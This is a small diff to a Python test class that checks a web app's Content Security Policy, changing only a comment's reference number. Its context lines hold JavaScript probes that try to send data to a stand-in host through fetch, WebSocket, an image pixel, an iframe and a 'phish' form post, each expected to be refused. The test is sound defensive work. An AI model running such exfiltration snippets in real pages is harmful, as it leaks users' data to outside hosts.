@@ -141,7 +141,7 @@ class ContentSecurityPolicy(unittest.TestCase):
         refused("(() => { fetch('https://example.invalid/leak?x=1').catch(() => {}); })()", "connect-src")
         refused("(() => { try { new WebSocket('wss://example.invalid/leak'); } catch (e) {} })()", "connect-src")
         refused("(() => { const i = new Image(); i.src = 'https://example.invalid/pixel.png'; document.body.appendChild(i); })()", "img-src")
-        # Flux frames only its own origin (a file preview, C-58); another site's page is refused.
+        # Flux frames only its own origin (a file preview, C-60); another site's page is refused.
         refused("(() => { const f = document.createElement('iframe'); f.src = 'https://example.invalid/frame'; document.body.appendChild(f); })()", "frame-src")
         refused("(() => { const f = document.createElement('form'); f.action = 'https://example.invalid/phish'; f.method = 'post'; document.body.appendChild(f); f.requestSubmit ? f.requestSubmit() : f.submit(); })()", "form-action")
         page.goto(control)
